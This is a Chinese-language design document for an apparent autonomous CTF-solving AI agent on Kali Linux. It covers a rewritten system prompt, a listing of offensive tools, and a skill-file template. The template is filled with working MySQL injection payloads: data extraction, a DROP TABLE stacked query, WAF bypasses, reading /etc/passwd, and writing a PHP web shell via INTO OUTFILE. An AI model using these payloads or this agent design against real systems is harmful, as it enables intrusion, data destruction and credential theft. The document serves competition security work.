# CTF-Agent 提示词与Skill系统优化设计

## 概述

**目标**：优化提示词和Skill系统，遵循Claude Code最佳实践——框架只做管道，AI自主决策。

**核心原则**：
- 提示词告诉AI"有什么"和"目标是什么"
- Skill只提供专业知识
- AI自己决定"怎么做"

---

## 第一部分：提示词优化设计

### 1.1 当前问题分析

| 问题 | 影响 |
|------|------|
| 决策框架预设过死 | "流程驱动"限制了AI灵活性 |
| 工具使用示例过多 | 占用token，AI需要自己探索工具用法 |
| 缺少方向性引导 | AI不知道什么时候用什么工具合适 |
| remember/recall使用率低 | 信息流转不畅，重复劳动 |

### 1.2 新提示词结构

```python
def build_system_prompt(target: str, timeout: int, competition_mode: bool = False) -> str:
    return f"""
# 身份与目标

你是CTF安全专家，拥有Kali Linux系统的完全控制权。

**目标**：找到FLAG（格式：flag{{...}}）

---

# 能力清单

## 系统工具（通过bash调用）

Kali Linux预装300+安全工具，你可以直接调用：

| 类别 | 代表工具 | 用途 |
|------|----------|------|
| 信息收集 | nmap, nuclei, whatweb, masscan | 端口、服务、漏洞扫描 |
| Web安全 | sqlmap, ffuf, dirsearch, nikto, gobuster | SQL注入、目录爆破、漏洞扫描 |
| 密码破解 | hashcat, john, hydra, medusa | 哈希破解、暴力枚举 |
| 二进制分析 | binwalk, strings, file, gdb, radare2 | 固件分析、逆向工程 |
| 漏洞利用 | searchsploit, msfconsole | CVE利用 |
| 内网渗透 | crackmapexec, impacket, responder, fscan | 域渗透、横向移动 |
| 网络工具 | curl, wget, netcat, socat, openssl | HTTP请求、隧道、加密 |

## MCP工具（直接调用）

| 工具 | 功能 |
|------|------|
| bash | 执行任意命令 |
| http | 发送HTTP请求 |
| read / write | 文件操作 |
| remember / recall | 记忆系统 |
| search_skills | 搜索专业知识库 |

## 比赛工具（仅比赛模式）

| 工具 | 功能 |
|------|------|
| list_challenges | 获取题目列表 |
| start_challenge | 启动题目实例 |
| submit_flag | 提交FLAG |
| stop_challenge | 停止实例 |
| view_hint | 查看提示（会扣分） |

---

# 可能遇到的场景

- **Web应用**：SQL注入、XSS、RCE、文件上传、SSRF、SSTI等
- **OA环境**：泛微、用友、致远等OA系统
- **内网环境**：域渗透、横向移动、权限提升
- **云环境**：容器逃逸、K8s安全、云元数据
- **二进制**：逆向工程、Pwn、密码学

---

# 行动原则

1. **信息驱动**：先观察再行动，收集的信息越多，决策越准确
2. **简单优先**：先尝试简单的攻击路径，失败再深入
3. **记录发现**：关键信息（端点、凭证、技术栈）用remember存储
4. **知识求助**：遇到不熟悉的漏洞类型，使用search_skills查询知识库

---

# 比赛模式说明

{'比赛模式启用' if competition_mode else '普通模式，直接攻击目标'}

比赛流程：
1. list_challenges → 获取题目
2. start_challenge → 启动实例
3. 攻击目标 → 找FLAG
4. submit_flag → 提交答案
5. stop_challenge → 释放资源

注意：
- 每队最多同时运行3个实例
- API限频：每秒3次
- 查看提示会扣10%分数

---

# 目标信息

**Target**: {target}
**Timeout**: {timeout}秒
{'**比赛平台**: 需通过list_challenges获取题目' if competition_mode else ''}

---

# 结束标记

找到FLAG后输出：
```
[TASK_COMPLETE] FLAG: flag{{xxx}}
```
"""
```

### 1.3 关键改进点

| 改进 | 说明 |
|------|------|
| **移除流程框架** | 不再规定"信息收集→漏洞发现→利用"，AI自己决定 |
| **工具能力清单化** | 告诉AI有什么工具，不教怎么用 |
| **场景枚举** | 告诉AI可能遇到什么，不教怎么处理 |
| **原则性引导** | 4条核心原则，方向性指导 |
| **比赛模式参数化** | 根据是否有competition_host动态切换 |

---

## 第二部分：Skill系统优化设计

### 2.1 当前问题分析

| 问题 | 示例 |
|------|------|
| 信息与提示词重复 | skill里有"攻击方法论"，提示词也有 |
| 缺少专业知识 | 绕过技巧、具体payload不够详细 |
| 触发条件缺失 | AI不知道什么时候该搜索这个skill |
| 工具示例冗余 | AI自己会构造命令 |

### 2.2 Skill设计原则

**Skill应该是纯知识库**：
- 漏洞原理
- 绕过技巧
- Payload模板
- 参考案例

**Skill不应该包含**：
- 决策框架（AI自己决定）
- 工具使用示例（AI自己探索）
- 触发条件（AI自己判断）

### 2.3 Skill模板规范

```yaml
name: sqli_mysql
description: MySQL注入攻击知识，涵盖注入类型检测、数据提取、WAF绕过
domain: web
version: "2.0"

# 知识内容（核心）
knowledge: |
  ## MySQL注入类型

  ### 1. 联合注入
  适用：有回显、列数可确定
  ```
  ' UNION SELECT 1,2,3--+
  ' UNION SELECT database(),user(),version()--+
  ```

  ### 2. 报错注入
  适用：有报错回显
  ```
  ' AND extractvalue(1,concat(0x7e,(SELECT database())))--+
  ' AND updatexml(1,concat(0x7e,(SELECT user())),1)--+
  ```

  ### 3. 盲注
  适用：无回显、无报错
  ```
  ' AND IF(ascii(substr(database(),1,1))>100,sleep(3),1)--+
  ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM information_schema.tables) END)--+
  ```

  ### 4. 堆叠注入
  适用：支持多语句执行
  ```
  '; DROP TABLE users;--+
  '; INSERT INTO users VALUES('hacker','password');--+
  ```

  ## 绕过技巧

  ### 大小写绕过
  SeLeCt, UnIoN, InFoRmAtIoN_sChEmA

  ### 双写绕过
  SELSELECTECT, UNUNIONION

  ### 编码绕过
  - URL编码: %27 %20 %23
  - Hex编码: 0x27
  - Unicode: \u0027

  ### 注释绕过
  - 内联注释: /*!50000select*/
  - 空字节: %00

  ## 系统库表

  ### information_schema
  - SCHEMATA: 所有数据库
  - TABLES: 表名
  - COLUMNS: 列名

  ### mysql
  - user: 用户账号
  - db: 数据库权限

  ## 常用Payload

  ### 提取数据库
  ' UNION SELECT schema_name FROM information_schema.schemata--+

  ### 提取表名
  ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--+

  ### 提取列名
  ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--+

  ### 提取数据
  ' UNION SELECT username,password FROM users--+

  ### 读文件
  ' UNION SELECT load_file('/etc/passwd')--+

  ### 写文件
  ' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--+
```

### 2.4 Skill分类优化

| 类别 | Skill数量 | 内容重点 |
|------|-----------|----------|
| **Web漏洞** | 50+ | 绕过技巧、Payload模板 |
| **内网渗透** | 20+ | 攻击链、工具参数 |
| **OA系统** | 10+ | 默认凭证、CVE编号 |
| **云安全** | 10+ | 容器逃逸、元数据利用 |
| **密码学** | 10+ | 算法弱点、攻击方法 |
| **二进制** | 10+ | 工具使用、调试技巧 |

### 2.5 search_skills工具优化

当前实现已经足够简洁：
```python
async def search_skills_handler(query: str):
    """搜索技能"""
    skills_dir = PROJECT_ROOT / "skills"
    results = []
    query_lower = query.lower()

    for skill_file in skills_dir.glob("*.yaml"):
        content = skill_file.read_text(encoding="utf-8", errors="replace").lower()
        if query_lower in content or query_lower in skill_file.stem.lower():
            results.append({
                "name": skill_file.stem,
                "file": str(skill_file.name)
            })

    return results
```

**建议增强**：返回skill的knowledge字段摘要（前500字符），帮助AI快速判断相关性。

---

## 第三部分：remember/recall使用引导

### 3.1 问题

当前AI很少主动使用remember/recall，导致信息流转不畅。

### 3.2 解决方案

在提示词中强调使用场景：

```
# 记忆系统使用场景

当你发现以下信息时，使用remember存储：
- 敏感端点：/admin, /backup, /api/debug
- 凭证信息：用户名、密码、Token、Cookie
- 技术栈：框架版本、数据库类型、服务器信息
- 漏洞点：注入点、文件路径、配置错误

示例：
```json
{"key": "admin_endpoint", "value": "/admin/backup.php"}
{"key": "db_type", "value": "MySQL 5.7"}
{"key": "sqli_param", "value": "id parameter vulnerable"}
```

后续攻击时，使用recall检索：
```json
{"query": "endpoint"}
{"query": "credential"}
```
```

---

## 第四部分：实现计划

### 4.1 文件修改清单

| 文件 | 操作 | 说明 |
|------|------|------|
| `app/prompts/ctf_system_prompt.py` | 重写 | 新提示词结构 |
| `app/cli.py` | 修改 | 支持competition_mode参数 |
| `skills/*.yaml` | 优化 | 50+个skill按新规范重写 |
| `mcp_servers/kali_server.py` | 增强 | search_skills返回摘要 |

### 4.2 实现优先级

1. **P0 - 核心提示词重写** - 立即实施
2. **P1 - 记忆系统引导增强** - 高优先级
3. **P2 - 关键Skill优化** - 优先处理高频skill（sqli, xss, rce, 内网）
4. **P3 - 全量Skill优化** - 逐步完成

### 4.3 验证方法

```bash
# 测试新提示词
python3 -m app.cli http://target.com

# 测试比赛模式
python3 -m app.cli --competition http://competition.host your-token

# 测试skill搜索
# AI应能根据目标特征主动搜索相关skill
```

---

## 附录：提示词完整示例

见实施阶段的 `app/prompts/ctf_system_prompt.py`

---

## 变更记录

| 版本 | 日期 | 变更 |
|------|------|------|
| 1.0 | 2026-04-06 | 初始设计 |